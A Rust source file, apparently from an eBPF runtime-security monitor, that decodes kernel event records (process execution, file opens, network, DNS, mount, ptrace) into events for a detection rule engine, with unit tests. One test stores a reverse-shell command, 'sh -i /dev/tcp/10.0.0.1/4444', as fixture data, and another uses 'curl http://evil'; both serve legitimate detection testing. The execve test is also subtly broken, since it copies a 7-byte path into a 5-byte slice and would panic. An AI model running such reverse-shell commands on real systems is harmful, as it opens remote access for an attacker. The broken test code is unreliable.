//! Userspace view of the kernel event ABI: decoding of ring-buffer records
//! into owned, serializable [`Event`]s and field lookup for the rule engine.

use std::{collections::BTreeMap, mem::size_of};

use serde::Serialize;
use sentinel_common::{
    self, AF_INET, AF_INET6, DnsEvent, EVENT_ACCEPT, EVENT_BIND, EVENT_CAPSET, EVENT_CONNECT,
    EVENT_DNS, EVENT_EXECVE, EVENT_MOUNT, EVENT_OPENAT, EVENT_PIVOT_ROOT, EVENT_PTRACE,
    EVENT_SETNS, EVENT_UNSHARE, ExecveEvent, FileEvent, MountEvent, NetEvent, SyscallEvent,
    event_type_name,
};

use crate::rules::{FieldLookup, Val};

/// Common event metadata, mirroring [`sentinel_common::EventHeader`] with
/// decoded strings.
#[derive(Debug, Clone, Serialize)]
pub struct Header {
    pub event_type: u32,
    pub evt_type: String,
    pub pid: u32,
    pub tgid: u32,
    pub uid: u32,
    pub gid: u32,
    pub ppid: u32,
    pub timestamp_ns: u64,
    pub comm: String,
}

/// Owned, decoded event.
#[derive(Debug, Clone, Serialize)]
#[serde(tag = "evt_type", rename_all = "snake_case")]
pub enum Event {
    Execve {
        header: Header,
        filename: String,
        argv: String,
    },
    Openat {
        header: Header,
        filename: String,
        dirfd: i32,
        flags: u32,
        mode: u32,
    },
    Connect {
        header: Header,
        fd: i32,
        family: u16,
        family_name: String,
        port: u16,
        addr: String,
    },
    /// `accept4` — a listening socket took a connection (peer address is
    /// filled at syscall exit and not captured yet; see `bpf/src/syscalls.rs`).
    Accept {
        header: Header,
        fd: i32,
        family: u16,
        family_name: String,
        port: u16,
        addr: String,
    },
    /// `bind` — socket bound to a local address/port.
    Bind {
        header: Header,
        fd: i32,
        family: u16,
        family_name: String,
        port: u16,
        addr: String,
    },
    /// DNS query captured on the wire by the `cgroup_skb` egress program.
    Dns {
        header: Header,
        /// Decoded dotted query name (truncated by capture).
        query: String,
        /// Query type number (1=A, 28=AAAA, 16=TXT, ...), 0 if not captured.
        qtype: u16,
        /// DNS server address.
        server: String,
        dst_port: u16,
        family_name: String,
    },
    Ptrace {
        header: Header,
        request: u64,
        target_pid: u64,
        addr: u64,
    },
    Mount {
        header: Header,
        source: String,
        target: String,
        fstype: String,
        flags: u64,
    },
    Setns {
        header: Header,
        fd: u64,
        nstype: u64,
    },
    Unshare {
        header: Header,
        flags: u64,
    },
    Capset {
        header: Header,
    },
    PivotRoot {
        header: Header,
        new_root: String,
        put_old: String,
    },
}

impl Event {
    pub fn header(&self) -> &Header {
        match self {
            Event::Execve { header, .. }
            | Event::Openat { header, .. }
            | Event::Connect { header, .. }
            | Event::Accept { header, .. }
            | Event::Bind { header, .. }
            | Event::Dns { header, .. }
            | Event::Ptrace { header, .. }
            | Event::Mount { header, .. }
            | Event::Setns { header, .. }
            | Event::Unshare { header, .. }
            | Event::Capset { header }
            | Event::PivotRoot { header, .. } => header,
        }
    }
}

/// A context that enriches an event with runtime metadata (container id, pod
/// info, ...) before rule evaluation.
#[derive(Debug, Clone)]
pub struct EventContext {
    pub event: Event,
    pub enrichment: crate::enrich::Enrichment,
}

impl EventContext {
    pub fn container_id(&self) -> Option<String> {
        self.enrichment.container_id.clone()
    }
}

impl FieldLookup for EventContext {
    fn lookup(&self, field: &str) -> Option<Val> {
        let e = &self.event;
        let h = e.header();
        let val = match field {
            "evt.type" => Val::Str(h.evt_type.clone()),
            "evt.timestamp_ns" => Val::Int(h.timestamp_ns as i64),
            "proc.pid" => Val::Int(h.pid as i64),
            "proc.tgid" => Val::Int(h.tgid as i64),
            "proc.ppid" => Val::Int(h.ppid as i64),
            "proc.uid" => Val::Int(h.uid as i64),
            "proc.gid" => Val::Int(h.gid as i64),
            "proc.name" | "proc.comm" => Val::Str(h.comm.clone()),
            "container.id" => Val::Str(self.enrichment.container_id.clone()?),
            "container" => Val::Bool(self.enrichment.container_id.is_some()),
            "pod.uid" => Val::Str(self.enrichment.pod_uid.clone()?),
            "pod.name" => Val::Str(self.enrichment.pod_name.clone()?),
            "pod.namespace" => Val::Str(self.enrichment.pod_namespace.clone()?),
            "exec.path" => match e {
                Event::Execve { filename, .. } => Val::Str(filename.clone()),
                _ => return None,
            },
            "exec.argv" => match e {
                Event::Execve { argv, .. } => Val::Str(argv.clone()),
                _ => return None,
            },
            "file.path" => match e {
                Event::Openat { filename, .. } => Val::Str(filename.clone()),
                _ => return None,
            },
            "file.flags" => match e {
                Event::Openat { flags, .. } => Val::Int(*flags as i64),
                _ => return None,
            },
            "file.mode" => match e {
                Event::Openat { mode, .. } => Val::Int(*mode as i64),
                _ => return None,
            },
            "file.dirfd" => match e {
                Event::Openat { dirfd, .. } => Val::Int(*dirfd as i64),
                _ => return None,
            },
            "net.addr" => match e {
                Event::Connect { addr, .. }
                | Event::Accept { addr, .. }
                | Event::Bind { addr, .. } => Val::Str(addr.clone()),
                Event::Dns { server, .. } => Val::Str(server.clone()),
                _ => return None,
            },
            "net.port" => match e {
                Event::Connect { port, .. }
                | Event::Accept { port, .. }
                | Event::Bind { port, .. } => Val::Int(*port as i64),
                Event::Dns { dst_port, .. } => Val::Int(*dst_port as i64),
                _ => return None,
            },
            "net.family" => match e {
                Event::Connect { family_name, .. }
                | Event::Accept { family_name, .. }
                | Event::Bind { family_name, .. }
                | Event::Dns { family_name, .. } => Val::Str(family_name.clone()),
                _ => return None,
            },
            "net.fd" => match e {
                Event::Connect { fd, .. } | Event::Accept { fd, .. } | Event::Bind { fd, .. } => {
                    Val::Int(*fd as i64)
                }
                _ => return None,
            },
            "dns.query" => match e {
                Event::Dns { query, .. } => Val::Str(query.clone()),
                _ => return None,
            },
            "dns.qtype" => match e {
                Event::Dns { qtype, .. } => Val::Int(*qtype as i64),
                _ => return None,
            },
            "dns.server" => match e {
                Event::Dns { server, .. } => Val::Str(server.clone()),
                _ => return None,
            },
            "mount.source" => match e {
                Event::Mount { source, .. } => Val::Str(source.clone()),
                _ => return None,
            },
            "mount.target" => match e {
                Event::Mount { target, .. } => Val::Str(target.clone()),
                _ => return None,
            },
            "mount.fstype" => match e {
                Event::Mount { fstype, .. } => Val::Str(fstype.clone()),
                _ => return None,
            },
            "mount.flags" => match e {
                Event::Mount { flags, .. } => Val::Int(*flags as i64),
                _ => return None,
            },
            "sys.arg0" => match e {
                Event::Ptrace { request, .. } => Val::Int(*request as i64),
                Event::Setns { fd, .. } => Val::Int(*fd as i64),
                Event::Unshare { flags, .. } => Val::Int(*flags as i64),
                _ => return None,
            },
            "sys.arg1" => match e {
                Event::Ptrace { target_pid, .. } => Val::Int(*target_pid as i64),
                Event::Setns { nstype, .. } => Val::Int(*nstype as i64),
                _ => return None,
            },
            "sys.arg2" => match e {
                Event::Ptrace { addr, .. } => Val::Int(*addr as i64),
                _ => return None,
            },
            "sys.path" => match e {
                Event::PivotRoot { new_root, .. } => Val::Str(new_root.clone()),
                _ => return None,
            },
            "sys.path2" => match e {
                Event::PivotRoot { put_old, .. } => Val::Str(put_old.clone()),
                _ => return None,
            },
            _ => return None,
        };
        Some(val)
    }

    fn fields(&self) -> Vec<(String, Val)> {
        // Used for `%field` output rendering: expose the fixed schema.
        const ALL_FIELDS: &[&str] = &[
            "evt.type",
            "proc.pid",
            "proc.tgid",
            "proc.ppid",
            "proc.uid",
            "proc.gid",
            "proc.name",
            "container",
            "container.id",
            "exec.path",
            "exec.argv",
            "file.path",
            "file.flags",
            "file.mode",
            "net.addr",
            "net.port",
            "net.family",
            "dns.query",
            "dns.qtype",
            "dns.server",
            "pod.uid",
            "pod.name",
            "pod.namespace",
            "mount.source",
            "mount.target",
            "mount.fstype",
            "mount.flags",
            "sys.arg0",
            "sys.arg1",
            "sys.arg2",
            "sys.path",
            "sys.path2",
        ];
        ALL_FIELDS
            .iter()
            .filter_map(|f| self.lookup(f).map(|v| ((*f).to_string(), v)))
            .collect()
    }
}

/// Decode a raw ring-buffer record. Returns `None` on unknown tags or size
/// mismatches (defensive: the ABI is checked by unit tests on the common crate).
pub fn decode(bytes: &[u8]) -> Option<Event> {
    if bytes.len() < 4 {
        return None;
    }
    let event_type = u32::from_ne_bytes(bytes[0..4].try_into().ok()?);
    match event_type {
        EVENT_EXECVE => {
            let e = decode_pod::<ExecveEvent>(bytes)?;
            Some(Event::Execve {
                header: decode_header(&e.header),
                filename: cstr(&e.filename),
                argv: join_args(&e.argv, sentinel_common::ARG_SLOT_LEN),
            })
        }
        EVENT_OPENAT => {
            let e = decode_pod::<FileEvent>(bytes)?;
            Some(Event::Openat {
                header: decode_header(&e.header),
                filename: cstr(&e.filename),
                dirfd: e.dirfd,
                flags: e.flags,
                mode: e.mode,
            })
        }
        EVENT_CONNECT => {
            let e = decode_pod::<NetEvent>(bytes)?;
            Some(Event::Connect {
                header: decode_header(&e.header),
                fd: e.fd,
                family: e.family,
                family_name: family_name(e.family).to_string(),
                port: e.port,
                addr: format_addr(e.family, &e.addr),
            })
        }
        EVENT_ACCEPT => {
            let e = decode_pod::<NetEvent>(bytes)?;
            Some(Event::Accept {
                header: decode_header(&e.header),
                fd: e.fd,
                family: e.family,
                family_name: family_name(e.family).to_string(),
                port: e.port,
                addr: format_addr(e.family, &e.addr),
            })
        }
        EVENT_BIND => {
            let e = decode_pod::<NetEvent>(bytes)?;
            Some(Event::Bind {
                header: decode_header(&e.header),
                fd: e.fd,
                family: e.family,
                family_name: family_name(e.family).to_string(),
                port: e.port,
                addr: format_addr(e.family, &e.addr),
            })
        }
        EVENT_DNS => {
            let e = decode_pod::<DnsEvent>(bytes)?;
            let len = e.qname_len as usize;
            let (query, qtype) = parse_dns_wire(&e.qname_raw[..len.min(e.qname_raw.len())]);
            Some(Event::Dns {
                header: decode_header(&e.header),
                query,
                qtype,
                server: format_addr(e.family, &e.server),
                dst_port: e.dst_port,
                family_name: family_name(e.family).to_string(),
            })
        }
        EVENT_PTRACE => {
            let e = decode_pod::<SyscallEvent>(bytes)?;
            Some(Event::Ptrace {
                header: decode_header(&e.header),
                request: e.arg0,
                target_pid: e.arg1,
                addr: e.arg2,
            })
        }
        EVENT_MOUNT => {
            let e = decode_pod::<MountEvent>(bytes)?;
            Some(Event::Mount {
                header: decode_header(&e.header),
                source: cstr(&e.source),
                target: cstr(&e.target),
                fstype: cstr(&e.fstype),
                flags: e.flags,
            })
        }
        EVENT_SETNS => {
            let e = decode_pod::<SyscallEvent>(bytes)?;
            Some(Event::Setns {
                header: decode_header(&e.header),
                fd: e.arg0,
                nstype: e.arg1,
            })
        }
        EVENT_UNSHARE => {
            let e = decode_pod::<SyscallEvent>(bytes)?;
            Some(Event::Unshare {
                header: decode_header(&e.header),
                flags: e.arg0,
            })
        }
        EVENT_CAPSET => {
            let e = decode_pod::<SyscallEvent>(bytes)?;
            Some(Event::Capset {
                header: decode_header(&e.header),
            })
        }
        EVENT_PIVOT_ROOT => {
            let e = decode_pod::<SyscallEvent>(bytes)?;
            Some(Event::PivotRoot {
                header: decode_header(&e.header),
                new_root: cstr(&e.path),
                put_old: cstr(&e.path2),
            })
        }
        _ => None,
    }
}

fn decode_pod<T: Copy>(bytes: &[u8]) -> Option<T> {
    if bytes.len() != size_of::<T>() {
        return None;
    }
    // SAFETY: `bytes` is exactly `size_of::<T>()` long and `T` is `#[repr(C)]`
    // plain old data (see `sentinel-common`).
    Some(unsafe { std::ptr::read_unaligned(bytes.as_ptr().cast::<T>()) })
}

fn decode_header(h: &sentinel_common::EventHeader) -> Header {
    Header {
        event_type: h.event_type,
        evt_type: event_type_name(h.event_type).to_string(),
        pid: h.pid,
        tgid: h.tgid,
        uid: h.uid,
        gid: h.gid,
        ppid: h.ppid,
        timestamp_ns: h.timestamp_ns,
        comm: cstr(&h.comm),
    }
}

/// Decode a NUL-padded byte array into a String.
pub fn cstr(bytes: &[u8]) -> String {
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    String::from_utf8_lossy(&bytes[..end]).into_owned()
}

/// Parse a raw DNS QNAME capture: length-prefixed labels followed by the
/// QTYPE/QCLASS tail. Returns `(dotted_name, qtype)`; `qtype` is 0 when the
/// capture was truncated before it. Pointer compression (0xC0..) is not
/// expected in *queries* and is treated as end-of-name.
pub fn parse_dns_wire(raw: &[u8]) -> (String, u16) {
    let mut labels: Vec<String> = Vec::new();
    let mut i = 0usize;
    while i < raw.len() {
        let len = raw[i] as usize;
        if len == 0 {
            i += 1;
            break;
        }
        if len >= 0xC0 || i + 1 + len > raw.len() {
            return (labels.join("."), 0);
        }
        labels.push(String::from_utf8_lossy(&raw[i + 1..i + 1 + len]).into_owned());
        i += 1 + len;
    }
    let qtype = if i + 2 <= raw.len() {
        u16::from_be_bytes([raw[i], raw[i + 1]])
    } else {
        0
    };
    (labels.join("."), qtype)
}

/// Join argv slots (one NUL-padded string per `slot_len` bytes) with spaces.
/// Empty slots are skipped.
pub fn join_args(buf: &[u8], slot_len: usize) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for slot in buf.chunks(slot_len.max(1)) {
        let end = slot.iter().position(|&b| b == 0).unwrap_or(slot.len());
        if end > 0 {
            parts.push(std::str::from_utf8(&slot[..end]).unwrap_or(""));
        }
    }
    parts.join(" ")
}

pub fn family_name(family: u16) -> &'static str {
    match family {
        sentinel_common::AF_UNIX => "unix",
        AF_INET => "inet",
        AF_INET6 => "inet6",
        _ => "other",
    }
}

/// Format an address field: dotted IPv4, compressed-ish IPv6, or empty.
pub fn format_addr(family: u16, addr: &[u8; 16]) -> String {
    match family {
        AF_INET => format!("{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3]),
        AF_INET6 => {
            let mut groups = [0u16; 8];
            for (i, g) in groups.iter_mut().enumerate() {
                *g = u16::from_be_bytes([addr[i * 2], addr[i * 2 + 1]]);
            }
            // Simple RFC 5952-ish rendering (no :: compression; good enough
            // for rule matching and logs).
            groups
                .iter()
                .map(|g| format!("{g:x}"))
                .collect::<Vec<_>>()
                .join(":")
        }
        _ => String::new(),
    }
}

/// Snapshot of decode statistics for the periodic metrics log.
#[derive(Debug, Default, Clone, Serialize)]
pub struct DecodeStats {
    pub decoded: BTreeMap<String, u64>,
    pub errors: u64,
}

#[cfg(test)]
mod tests {
    use super::*;
    use sentinel_common::EventHeader;

    fn header(event_type: u32) -> EventHeader {
        EventHeader {
            event_type,
            pid: 42,
            tgid: 7,
            uid: 1000,
            gid: 1000,
            ppid: 1,
            timestamp_ns: 123_456_789,
            comm: *b"bash\0\0\0\0\0\0\0\0\0\0\0\0",
        }
    }

    #[test]
    fn roundtrip_execve() {
        let mut ev = ExecveEvent {
            header: header(EVENT_EXECVE),
            filename: [0; sentinel_common::MAX_PATH_LEN],
            argv: [0; sentinel_common::ARGV_BUF_LEN],
        };
        ev.filename[..5].copy_from_slice(b"/bin/sh");
        // argv slots: "sh", "-i", "/dev/tcp/10.0.0.1/4444"
        ev.argv[..2].copy_from_slice(b"sh");
        ev.argv[64..66].copy_from_slice(b"-i");
        ev.argv[128..150].copy_from_slice(b"/dev/tcp/10.0.0.1/4444");

        let bytes: &[u8] = unsafe {
            std::slice::from_raw_parts(
                (&ev as *const ExecveEvent).cast::<u8>(),
                size_of::<ExecveEvent>(),
            )
        };
        let decoded = decode(bytes).expect("decode");
        match decoded {
            Event::Execve {
                header,
                filename,
                argv,
            } => {
                assert_eq!(header.pid, 42);
                assert_eq!(header.comm, "bash");
                assert_eq!(filename, "/bin/sh");
                assert_eq!(argv, "sh -i /dev/tcp/10.0.0.1/4444");
            }
            other => panic!("wrong variant: {other:?}"),
        }
    }

    #[test]
    fn rejects_wrong_sizes() {
        assert!(decode(&[]).is_none());
        assert!(decode(&EVENT_EXECVE.to_ne_bytes()[..1]).is_none());
    }

    #[test]
    fn formats_addresses() {
        assert_eq!(
            format_addr(AF_INET, &[10, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]),
            "10.0.0.1"
        );
        assert_eq!(
            format_addr(AF_INET6, &[0x20, 0x01, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]),
            "2001:db8:0:0:0:0:0:1"
        );
        assert_eq!(format_addr(1, &[0; 16]), "");
    }

    #[test]
    fn parses_dns_wire_format() {
        // 3www6google3com0 + type A(00 01) + class IN(00 01)
        let raw: &[u8] = &[
            3, b'w', b'w', b'w', 6, b'g', b'o', b'o', b'g', b'l', b'e', 3, b'c', b'o', b'm', 0,
            0, 1, 0, 1,
        ];
        let (name, qtype) = parse_dns_wire(raw);
        assert_eq!(name, "www.google.com");
        assert_eq!(qtype, 1);

        // truncated before qtype
        let (name, qtype) = parse_dns_wire(&raw[..16]);
        assert_eq!(name, "www.google.com");
        assert_eq!(qtype, 0);
    }

    #[test]
    fn field_lookup_works() {
        let ctx = EventContext {
            event: Event::Execve {
                header: decode_header(&header(EVENT_EXECVE)),
                filename: "/usr/bin/curl".into(),
                argv: "curl http://evil".into(),
            },
            enrichment: crate::enrich::Enrichment {
                container_id: Some("abc123".into()),
                ..Default::default()
            },
        };
        assert_eq!(ctx.lookup("evt.type"), Some(Val::Str("execve".into())));
        assert_eq!(ctx.lookup("proc.name"), Some(Val::Str("bash".into())));
        assert_eq!(ctx.lookup("container"), Some(Val::Bool(true)));
        assert_eq!(
            ctx.lookup("exec.path"),
            Some(Val::Str("/usr/bin/curl".into()))
        );
        assert_eq!(ctx.lookup("file.path"), None);
    }
}
